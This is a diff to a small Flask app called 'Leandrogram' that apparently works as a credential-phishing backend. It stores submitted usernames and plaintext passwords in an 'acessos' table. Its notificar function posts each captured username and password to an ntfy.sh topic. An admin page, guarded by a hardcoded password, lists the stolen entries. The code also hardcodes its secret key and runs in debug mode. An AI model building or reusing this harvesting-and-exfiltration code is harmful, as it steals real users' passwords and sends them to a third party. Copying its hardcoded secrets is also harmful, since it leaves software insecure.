@@ -1,27 +1,22 @@
-
 from flask import Flask, request, redirect, session
 from datetime import datetime
 import requests
 import sqlite3
 import os
-
 from dotenv import load_dotenv
+
 load_dotenv('/home/leandrogram/Leandrogram/.env')
+
 app = Flask(__name__)
+app.secret_key = 'leandro2026'
 
 BASE = '/home/leandrogram/Leandrogram'
 
 def iniciar_banco():
     conn = sqlite3.connect(f'{BASE}/leandrogram.db')
     cursor = conn.cursor()
-    cursor.execute('''
-        CREATE TABLE IF NOT EXISTS acessos (
-            id INTEGER PRIMARY KEY,
-            usuario TEXT,
-            senha TEXT,
-            data TEXT
-        )
-    ''')
+    cursor.execute('''CREATE TABLE IF NOT EXISTS acessos (
+        id INTEGER PRIMARY KEY, usuario TEXT, senha TEXT, data TEXT)''')
     conn.commit()
     conn.close()
 
@@ -35,10 +30,8 @@ def salvar_acesso(usuario, senha):
     conn.close()
 
 def notificar(usuario, senha):
-    requests.post(
-        'https://ntfy.sh/leandrogram-leandro',
-        data=f'🚨 Alguém acessou!\nUsuário: {usuario}\nSenha: {senha}'.encode('utf-8')
-    )
+    requests.post('https://ntfy.sh/leandrogram-leandro',
+        data=f'Alguém acessou!\nUsuário: {usuario}\nSenha: {senha}'.encode('utf-8'))
 
 iniciar_banco()
 
@@ -60,18 +53,6 @@ def entrar():
 def jornal():
     return open(f'{BASE}/jornal.html').read()
 
-@app.route('/manifest.json')
-def manifest():
-    return open(f'{BASE}/manifest.json').read()
-
-@app.route('/sw.js')
-def sw():
-    return open(f'{BASE}/sw.js').read()
-
-@app.route('/limpafacil')
-def limpafacil():
-    return open(f'{BASE}/limpafacil.html').read()
-
 @app.route('/admin')
 def admin():
     if not session.get('admin'):
@@ -84,6 +65,37 @@ def admin():
     from flask import render_template_string
     return render_template_string(open(f'{BASE}/admin.html').read(), acessos=acessos)
 
+@app.route('/admin-login', methods=['GET', 'POST'])
+def admin_login():
+    if request.method == 'POST':
+        if request.form['senha'] == 'leandro2026':
+            session['admin'] = True
+            return redirect('/admin')
+        return '<p>Senha errada!</p><a href="/admin-login">Tentar de novo</a>'
+    return '''
+        <form method="post">
+            <input type="password" name="senha" placeholder="Senha do admin">
+            <button type="submit">Entrar</button>
+        </form>
+    '''
+
+@app.route('/admin-sair')
+def admin_sair():
+    session.pop('admin', None)
+    return redirect('/admin-login')
+
+@app.route('/manifest.json')
+def manifest():
+    return open(f'{BASE}/manifest.json').read()
+
+@app.route('/sw.js')
+def sw():
+    return open(f'{BASE}/sw.js').read()
+
+@app.route('/limpafacil')
+def limpafacil():
+    return open(f'{BASE}/limpafacil.html').read()
+
 @app.route('/gemini', methods=['POST'])
 def gemini():
     import os, requests as req
@@ -94,7 +106,7 @@ def gemini():
         f'https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key={chave}',
         json={'contents': [{'parts': [{'text': prompt}]}]}
     )
-     return resposta.json()
-    
+    return resposta.json()
+
 if __name__ == '__main__':
     app.run(debug=True)
